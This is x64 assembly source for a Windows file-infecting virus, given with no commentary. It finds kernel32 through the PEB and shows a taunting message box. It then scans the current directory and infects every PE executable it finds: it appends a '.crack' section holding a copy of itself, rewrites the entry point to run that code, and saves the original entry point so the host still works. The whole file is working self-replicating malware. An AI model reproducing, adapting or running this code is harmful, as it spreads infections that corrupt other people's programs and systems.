.code
main PROC 
    pFuncParam5 = qword ptr -148h
    pFuncParam6 = qword ptr -140h
    pFuncParam7 = qword ptr -138h
    dwNewRVAOfEntryPoint = dword ptr -134h
    dwOldRVAOfEntryPoint = dword ptr -130h
    pCurrentFileBuffer = qword ptr -128h
    pLoadedSectionBuffer = qword ptr -120h
    pLoadBase = qword ptr -118h
    dwSizeOfCurrentFile= dword ptr -110h
    dwSizeOfLoadedSection= dword ptr -10ch
    dwSignatureOffset= dword ptr -108h
    buffer0= byte ptr -104h
    buffer1= byte ptr -103h
    buffer2= byte ptr -102h
    buffer3= byte ptr -101h
    buffer4= byte ptr -100h
    buffer5= byte ptr -0ffh
    buffer6= byte ptr -0feh
    buffer7= byte ptr -0fdh
    buffer8= byte ptr -0fch
    buffer9= byte ptr -0fbh
    bufferA= byte ptr -0fah
    bufferB= byte ptr -0f9h
    bufferC= byte ptr -0f8h
    bufferD= byte ptr -0f7h
    bufferE= byte ptr -0f6h
    bufferF= byte ptr -0f5h
    buffer10= byte ptr -0f4h
    buffer11= byte ptr -0f3h
    buffer12= byte ptr -0f2h
    buffer13= byte ptr -0f1h
    buffer14= byte ptr -0f0h
    buffer15= byte ptr -0efh
    buffer16= byte ptr -0eeh
    buffer17= byte ptr -0edh
    buffer18= byte ptr -0ech
    buffer19= byte ptr -0ebh
    buffer1A= byte ptr -0eah
    buffer1B= byte ptr -0e9h
    buffer1C= byte ptr -0e8h
    buffer1D= byte ptr -0e7h
    buffer1E= byte ptr -0e6h
    buffer1F= byte ptr -0e5h

; Prolog
    push rbp
    push rdi
    mov rbp, rsp
    mov rdi, rsp
    sub rsp, 168h
    and rsp, 0FFFFFFFFFFFFFFF0h
    
; Get the base address of kernel32.dll using PEB
    mov rbx, gs:[60h]   
    mov rbx, [rbx + 18h]
    mov rbx, [rbx + 20h]
_loop1:
    mov rbx, [rbx + 00h]
    mov rcx, rbx
    mov rcx, [rcx + 40h]
    xor rdx, rdx
    mov dl, [rcx + 34h]
    cmp rdx, '3'
    jne _loop1
    mov rbx, [rbx + 20h]
    mov r13, rbx

; Get the address of GetProcAddress in kernel32.dll
    xor rbx, rbx
    mov ebx, [r13 + 180h]
    add rbx, r13
    mov ebx, [rbx + 1ch]
    add rbx, r13
    mov rcx, 2b8h

_loop2:
    add rbx, 4
    dec rcx
    cmp rcx, 0
    ja _loop2
    mov edx, [rbx]
    add rdx, r13
    mov r14, rdx
    mov rcx, r13
    lea rdx, [rbp + buffer0]
    call r14
    mov rbx, rax

; Get the address of LoadLibraryA in kernel32.dll
    mov [rbp + buffer0], 'L'
    mov [rbp + buffer1], 'o'
    mov [rbp + buffer2], 'a'
    mov [rbp + buffer3], 'd'
    mov [rbp + buffer4], 'L'
    mov [rbp + buffer5], 'i'
    mov [rbp + buffer6], 'b'
    mov [rbp + buffer7], 'r'
    mov [rbp + buffer8], 'a'
    mov [rbp + buffer9], 'r'
    mov [rbp + bufferA], 'y'
    mov [rbp + bufferB], 'A'
    mov [rbp + bufferC], 00h
    mov rcx, r13
    lea rdx, [rbp + buffer0]
    call r14
    mov rbx, rax

; Load user32.dll
    mov [rbp + buffer0], 'U'
    mov [rbp + buffer1], 'S'
    mov [rbp + buffer2], 'E'
    mov [rbp + buffer3], 'R'
    mov [rbp + buffer4], '3'
    mov [rbp + buffer5], '2'
    mov [rbp + buffer6], '.'
    mov [rbp + buffer7], 'D'
    mov [rbp + buffer8], 'L'
    mov [rbp + buffer9], 'L'
    mov [rbp + bufferA], 00h
    lea rcx, [rbp + buffer0]
    call rbx
    mov rbx, rax

; Get the address of MessageBoxA in user32.dll
    mov [rbp + buffer0], 'M'
    mov [rbp + buffer1], 'e'
    mov [rbp + buffer2], 's'
    mov [rbp + buffer3], 's'
    mov [rbp + buffer4], 'a'
    mov [rbp + buffer5], 'g'
    mov [rbp + buffer6], 'e'
    mov [rbp + buffer7], 'B'
    mov [rbp + buffer8], 'o'
    mov [rbp + buffer9], 'x'
    mov [rbp + bufferA], 'A'
    mov [rbp + bufferB], 00h
    mov rcx, rbx
    lea rdx, [rbp + buffer0]
    call r14
    mov rbx, rax

; MessageBoxA(NULL, "ehehehehe", "hehe", MB_ICONASTERISK)
    mov [rbp + buffer0], 'e'
    mov [rbp + buffer1], 'h'
    mov [rbp + buffer2], 'e'
    mov [rbp + buffer3], 'h'
    mov [rbp + buffer4], 'e'
    mov [rbp + buffer5], 'h'
    mov [rbp + buffer6], 'e'
    mov [rbp + buffer7], 'h'
    mov [rbp + buffer8], 'e'
    mov [rbp + buffer9], 'h'
    mov [rbp + bufferA], 'e'
    mov [rbp + bufferB], 00h

    mov [rbp + bufferC], 'h'
    mov [rbp + bufferD], 'e'
    mov [rbp + bufferE], 'h'
    mov [rbp + bufferF], 'e'
    mov [rbp + buffer10], 00h

    mov rcx, 0
    lea rdx, [rbp + buffer0]
    lea r8, [rbp + bufferC]
    mov r9, 40h
    call rbx

; GetModuleHandleA(NULL)
    mov rax, r13
    add rax, 1f3f0h
    xor rcx, rcx
    call rax
    mov rbx, rax
    mov [rbp + pLoadBase], rax

; GetModuleFileNameA(<handle to this image>, buffer0, MAX_PATH)
    mov rax, r13
    add rax, 1f4e0h
    mov rcx, [rbp + pLoadBase]
    lea rdx, [rbp + buffer0]
    mov r8, 100h
    call rax

; CreateFile(<module file name>, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
    mov rax, r13
    add rax, 24e90h
    lea rcx, [rbp + buffer0]
    mov rdx, 080000000h
    mov r8, 1
    mov r9, 0
    mov r10, 4
    mov [rsp + 20h], r10
    mov r10, 80h
    mov [rsp + 28h], r10
    mov r10, 0
    mov [rsp + 30h], r10
    call rax
    mov r14, rax

; GetFileSize(<file handle>, <file size>)
    mov rax, r13
    add rax, 250c0h
    mov rcx, r14
    lea rdx, [rbp + dwSizeOfCurrentFile]
    call rax
    mov [rbp + dwSizeOfCurrentFile], eax

; VirtualAlloc(NULL, <size of file>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    mov rax, r13
    add rax, 18840h
    mov rcx, 0
    mov edx, [rbp + dwSizeOfCurrentFile]
    mov r8, 00003000h
    mov r9, 40h
    call rax
    mov [rbp + pCurrentFileBuffer], rax

; ReadFile(<file handle>, buffer, <size of file>, <bytes read>, NULL)
    mov rax, r13
    add rax, 25220h
    mov rcx, r14
    mov rdx, [rbp + pCurrentFileBuffer]
    mov r8d, [rbp + dwSizeOfCurrentFile]
    mov r9, 0
    mov r10, 0
    mov [rsp + 20h], r10
    call rax

; CloseHandle(<module file handle>)
    mov rax, r13
    add rax, 24c20h
    mov rcx, r14
    call rax

; Get the last section
    mov r8d, [rbx + 3ch]
    mov r10, [rbp + pLoadBase]
    add r8, r10
    and rcx, 0
    mov cx, [r8 + 6]
    mov rdx, r8
    add rdx, 108h
    sub rdx, 28h
_loop3:
    sub rcx, 1
    add rdx, 28h
    cmp rcx, 0
    jne _loop3
    mov rbx, rdx
    mov r10d, [rbx + 10h]
    mov [rbp + dwSizeOfLoadedSection], r10d

; VirtualAlloc(NULL, <size of last section>, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    mov rax, r13
    add rax, 18840h
    mov rcx, 0
    mov rdx, 0
    mov edx, [rbx + 10h]
    mov r8, 00001000h
    mov r9, 40h
    call rax
    mov r15, rax

; GetCurrentProcessId()
    mov rax, r13
    add rax, 24bd0h
    call rax

; OpenProcess(PROCESS_ALL_ACCESS, NULL, <current PID>)
    mov r8, rax
    mov rax, r13
    add rax, 1b120h
    mov rcx, 1ffffh
    mov rdx, 0
    call rax
    mov r12, rax

; WriteProcessMemory(<handle to current process>, <allocated space>, <start location of section>, <size of section>, NULL)
    mov rax, r13
    add rax, 3e390h
    mov rcx, r12
    mov rdx, r15
    mov r8d, [rbx + 14h]
    mov r10, [rbp + pCurrentFileBuffer]
    add r8, r10
    mov r9d, [rbx + 10h]
    mov r10, 0
    mov [rsp + 20h], r10
    call rax
    mov [rbp + pLoadedSectionBuffer], r15

; VirtualFree(<file buffer>, 0, MEM_RELEASE)
    mov rax, r13
    add rax, 1a470h
    mov rcx, [rbp + pCurrentFileBuffer]
    mov r8, 0
    mov r9, 00008000h
    call rax

; GetCurrentDirectoryA
    mov rax, r13
    add rax, 21390h
    mov rcx, 260
    lea rdx, [rbp + buffer0]
    call rax

; FindFirstFile("*", buffer + 2)
    mov rax, r13
    add rax, 24f40h
    mov [rbp + buffer0], '*'
    mov [rbp + buffer1], 00h
    lea rcx, [rbp + buffer0]
    mov rdx, rbp
    add rdx, buffer0
    add rdx, 2
    mov rbx, rdx
    call rax
    mov r15, rax
    add rbx, 2ch

ParseCurrentFile:
; GetFileAttributesA(<file name>)
    mov rax, r13
    add rax, 25070h
    lea rcx, [rbx]
    call rax

; Check if this is a directory
   and rax, 10h
   cmp rax, 0
   jne FindNextFile
   
; CreateFile(<file name>, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
    mov rax, r13
    add rax, 24e90h
    mov rcx, rbx
    mov rdx, 0c0000000h
    mov r8, 3
    mov r9, 0
    mov r10, 4
    mov [rsp + 20h], r10
    mov r10, 80h
    mov [rsp + 28h], r10
    mov r10, 0
    mov [rsp + 30h], r10
    call rax
    mov r14, rax

; GetFileSize(<file handle>, <file size>)
    mov rax, r13
    add rax, 250c0h
    mov rcx, r14
    lea rdx, [rbp + dwSizeOfCurrentFile]
    call rax
    mov [rbp + dwSizeOfCurrentFile], eax

;GetLastError:
;    mov rbx, r13
;    add rbx, 15f30h
;    call rbx

; VirtualAlloc(NULL, <size of file + size of section + 0x2000>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    mov rax, r13
    add rax, 18840h
    mov rcx, 0
    mov edx, [rbp + dwSizeOfCurrentFile]
    add edx, [rbp + dwSizeOfLoadedSection]
    add edx, 2000h
    mov r8, 00003000h
    mov r9, 40h
    call rax
    mov [rbp + pCurrentFileBuffer], rax

; ReadFile(<file handle>, buffer, <size of file + size of section + 0x2000>, <bytes read>, NULL)
    mov rax, r13
    add rax, 25220h
    mov rcx, r14
    mov rdx, [rbp + pCurrentFileBuffer]
    mov r8d, [rbp + dwSizeOfCurrentFile]
    add r8d, [rbp + dwSizeOfLoadedSection]
    add r8d, 2000h
    mov r9, 0
    mov r10, 0
    mov [rsp + 20h], r10
    call rax

; CloseHandle(<file handle>)
    mov rax, r13
    add rax, 24c20h
    mov rcx, r14
    call rax

; CreateFile(<file name>, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
    mov rax, r13
    add rax, 24e90h
    mov rcx, rbx
    mov rdx, 0c0000000h
    mov r8, 3
    mov r9, 0
    mov r10, 4
    mov [rsp + 20h], r10
    mov r10, 80h
    mov [rsp + 28h], r10
    mov r10, 0
    mov [rsp + 30h], r10
    call rax
    mov r14, rax

; PE check
    lea rcx, [rbp + pCurrentFileBuffer]
    mov rcx, [rcx]
    and rdx, 0
    mov edx, [rcx + 3ch]
    mov [rbp + dwSignatureOffset], edx
    cmp rdx, 3ch
    jle FindNextFile
    cmp rdx, 200h
    jge FindNextFile
    add rcx, rdx
    mov dl, 'P'
    cmp [rcx], dl
    jne FindNextFile
    mov dl, 'E'
    cmp [rcx + 1], dl
    jne FindNextFile
    mov dl, 0
    cmp [rcx + 2], dl
    jne FindNextFile
    mov dl, 0
    cmp [rcx + 3], dl
    jne FindNextFile

; Change the number of section
    mov rcx, [rbp + pCurrentFileBuffer]
    and rdx, 0
    mov edx, [rbp + dwSignatureOffset]
    add rcx, rdx
    add rcx, 6
    and rdx, 0
    mov dl, [rcx]
    mov r8, rdx
    add dl, 1
    mov [rcx], dl

; Change the size of image
    mov rcx, [rbp + pCurrentFileBuffer]
    and rdx, 0
    mov edx, [rbp + dwSignatureOffset]
    add rcx, rdx
    add rcx, 50h
    and rdx, 0
    mov edx, [rcx]
    add edx, [rbp + dwSizeOfLoadedSection]
    and rdx, 0FFFFFFFFFFFFF000h
    add rdx, 1000h
    mov [rcx], edx

; Change the size of headers
    mov rcx, [rbp + pCurrentFileBuffer]
    and rdx, 0
    mov edx, [rbp + dwSignatureOffset]
    add rcx, rdx
    add rcx, 54h
    and rdx, 0
    mov edx, [rcx]
    add edx, 28h
    and rdx, 0FFFFFFFFFFFFFC00h
    add rdx, 200h
    mov [rcx], edx

; Change the section table (If a section with same name exists, pass)
    mov rcx, [rbp + pCurrentFileBuffer]
    and rdx, 0
    mov edx, [rbp + dwSignatureOffset]
    add rcx, rdx
    add rcx, 108h
    mov rax, 28h
    mul r8
    add rcx, rax
    mov r9, rcx
    sub r9, 28h
    and rax, 0
    and rdx, 0
    mov r10, 100h
    mov dl, [r9 + 1]
    add rax, rdx
    mul r10
    mov dl, [r9 + 2]
    add rax, rdx
    mul r10
    mov dl, [r9 + 3]
    add rax, rdx
    mul r10
    mov dl, [r9 + 4]
    add rax, rdx
    mul r10
    mov dl, [r9 + 5]
    add rax, rdx
    mov rdx, 637261636bh
    cmp rax, rdx
    je ParseCleanup
    and rdx, 0
    mov dl, '.'
    mov [rcx], dl
    mov dl, 'c'
    mov [rcx + 1], dl
    mov dl, 'r'
    mov [rcx + 2], dl
    mov dl, 'a'
    mov [rcx + 3], dl
    mov dl, 'c'
    mov [rcx + 4], dl
    mov dl, 'k'
    mov [rcx + 5], dl
    mov edx, [rbp + dwSizeOfLoadedSection]
    mov [rcx + 8], edx
    mov edx, [r9 + 0ch]
    add edx, [r9 + 8]
    and rdx, 0FFFFFFFFFFFFF000h
    add rdx, 1000h
    mov [rcx + 0ch], edx
    add rdx, 5
    mov [rbp + dwNewRVAOfEntryPoint], edx
    and r8, 0
    mov r8d, [rbp + dwSizeOfLoadedSection]
    and r8, 0FFFFFFFFFFFFFC00h
    add r8, 200h
    mov [rcx + 10h], r8d
    mov edx, [r9 + 14h]
    add edx, [r9 + 10h]
    mov [rcx + 14h], edx
    mov rbx, rdx
    mov edx, 0
    mov [rcx + 18h], edx
    mov edx, 0
    mov [rcx + 1ch], edx
    mov dl, 0
    mov [rcx + 20h], dl
    mov dl, 0
    mov [rcx + 22h], dl
    mov rdx, 0e0000020h
    mov [rcx + 24h], edx

; Change the address of entry point
    mov rcx, [rbp + pCurrentFileBuffer]
    and rdx, 0
    mov edx, [rbp + dwSignatureOffset]
    add rcx, rdx
    add rcx, 28h
    and rdx, 0
    mov edx, [rcx]
    mov [rbp + dwOldRVAOfEntryPoint], edx
    mov edx, [rbp + dwNewRVAOfEntryPoint]
    mov [rcx], edx

; Backup the address of entry point
    mov rcx, [rbp + pCurrentFileBuffer]
    add rcx, 40h
    mov edx, [rbp + dwOldRVAOfEntryPoint]
    mov [rcx], edx

; WriteProcessMemory(<handle to current process>, <ReadFile buffer + write offset>, <section buffer>, <size of section>, NULL)
    mov rax, r13
    add rax, 3e390h
    mov rcx, r12
    mov rdx, [rbp + pCurrentFileBuffer]
    add rdx, rbx
    mov r8, [rbp + pLoadedSectionBuffer]
    and r9, 0
    mov r9d, [rbp + dwSizeOfLoadedSection]
    mov r10, 0
    mov [rsp + 20h], r10
    call rax

; WriteFile(<handle to the file>, <file buffer>, <size of file + size of section + 0x2000>, r9, NULL)
    mov rax, r13
    add rax, 25310h
    mov rcx, r14
    mov rdx, [rbp + pCurrentFileBuffer]
    mov r8d, [rbp + dwSizeOfCurrentFile]
    add r8d, [rbp + dwSizeOfLoadedSection]
    add r8d, 2000h
    mov r9, 0
    mov r10, 0
    mov [rsp + 20h], r10
    call rax

ParseCleanup:
; CloseHandle(<file handle>)
    mov rax, r13
    add rax, 24c20h
    mov rcx, r14
    call rax

; VirtualFree(<file buffer>, 0, MEM_RELEASE)
    mov rax, r13
    add rax, 1a470h
    mov rcx, [rbp + pCurrentFileBuffer]
    mov r8, 0
    mov r9, 00008000h
    call rax

FindNextFile:
; FindNextFileA(<findnext handle>, buffer + 2)
    mov rax, r13
    add rax, 24fb0h
    mov rcx, r15
    lea rdx, [rbp + buffer0]
    add rdx, 2
    mov rbx, rdx
    call rax
    add rbx, 2ch

; GetLastError()
    mov rax, r13
    add rax, 15f30h
    call rax
    cmp rax, 12h
    jne ParseCurrentFile


; Jump to the real entry point of the PE
    mov rax, [rbp + pLoadBase]
    and rbx, 0
    mov ebx, [rax + 40h]
    add rax, rbx
    mov rsp, rbp
    pop rdi
    pop rbp
    jmp rax

;; ExitProcess(0)
;    mov rax, r13
;    add rax, 1e3e0h
;    mov rcx, 0
;    call rax
;
;; Epilog
;    mov rsp, rbp
;    pop rdi
;    pop rbp
;    xor rax, rax
    ret
main ENDP
END

;GetLastError:
;    mov rbx, r13
;    add rbx, 15f30h
;    call rbx